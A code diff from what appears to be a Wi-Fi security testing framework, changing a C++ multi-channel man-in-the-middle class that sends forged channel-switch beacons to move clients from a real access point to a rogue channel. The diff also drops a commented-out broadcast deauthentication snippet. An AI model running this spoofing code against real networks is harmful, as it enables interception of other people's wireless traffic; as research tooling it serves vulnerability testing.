@@ -36,21 +36,19 @@ McMitm::McMitm(ActorPtr rogue_sta, ActorPtr rogue_ap, const ActorPtr &sta, Actor
 
 McMitm::~McMitm() { stop(); }
 
-//TODO cache frames like in the channel_switch.cpp
-void McMitm::send_csa_beacon(const int numpairs, const optional<HWAddress<6>> &target, const int beacon_interval_ms) const {
+/*//TODO cache frames like in the channel_switch.cpp
+void McMitm::send_csa_beacon(const optional<HWAddress<6>> &target, const int beacon_interval_ms) const {
 	// Intel firmware: must see count >= 2 before count  //TODO source? Python?
-	for(int i = 0; i < numpairs; ++i) {
-		for(int count = CSA_attack::CHANNEL_SWITCH_MAX; count >= 0; --count) {
-			RadioTap csa_rt = CSA_attack::get_CSA_beacon(
-				ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, count, beacon.get());
-			if(target.has_value()) {
-				if(auto *b = csa_rt.find_pdu<Dot11Beacon>()) b->addr1(*target);
-			}
-			send_to_real(csa_rt);
-			interruptible_sleep(milliseconds(beacon_interval_ms));
+	for(int count = CSA_attack::CHANNEL_SWITCH_MAX; count >= 0; --count) {
+		RadioTap csa_rt = CSA_attack::get_CSA_beacon(
+			ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, count, beacon.get());
+		if(target.has_value()) {
+			if(auto *b = csa_rt.find_pdu<Dot11Beacon>()) b->addr1(*target);
 		}
+		send_to_real(csa_rt);
+		interruptible_sleep(milliseconds(beacon_interval_ms));
 	}
-}
+}*/
 
 void McMitm::setup_real_AP_RSN_frames(int beacon_timeout_sec) {
 	rogue_sta->set_iface_up();
@@ -64,7 +62,7 @@ void McMitm::setup_real_AP_RSN_frames(int beacon_timeout_sec) {
 		std::nullopt,
 		rogue_sta[SK::netns]);
 	if(beacon == nullptr)
-		throw run_err("No beacon received of network \"{}\". Is monitor mode working? Did you enter the correct SSID?",
+		throw run_err("No beacon received of network \"{}\".",
 			ap.get(SK::ssid));
 
 	log(LogLevel::INFO,
@@ -132,16 +130,11 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 
 	rs.start_observers(ObserverRunPolicy::SKIP); //after mc_mitm preparation, skip because dmesg
 
-	// only for non MFP clients, AP -> broadcast
-	/*Dot11Deauthentication deauth(HWAddress<6>::broadcast, ap.get(SK::mac));
-	deauth.addr3(ap.get(SK::mac));
-	deauth.reason_code(3);
-	send_to_real(deauth);*/
-
 	auto next_beacon = steady_clock::now();
 	const auto start_time = steady_clock::now();
 
-	int csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
+	csa_frames = CSA_attack::get_CSA_frames(ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, beacon, sta.get(SK::mac));
+
 	while(!stop_mitm) {
 		if(timeout_sec > 0 && steady_clock::now() > start_time + seconds(timeout_sec)) {
 			log(LogLevel::INFO, "McMitm timeout reached, stopping.");
@@ -174,11 +167,12 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 			const bool client_associated = client_state.get_state() >= ClientState::GotMitm;
 			if(!client_associated) {
 				const bool custom = hooks && hooks->send_periodic_beacon(*this);
+
 				if(!custom) {
-					RadioTap csa_rt = CSA_attack::get_CSA_beacon(
-						ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, csa_count, beacon.get());
-					send_to_real(csa_rt);
-					if(--csa_count < 0) csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
+					CSA_attack::update_time_CSA_frames(csa_frames);
+					for(auto &csa_frame : csa_frames) {
+						send_to_real(csa_frame);
+					}
 				}
 			}
 			next_beacon += milliseconds(beacon_interval_ms);
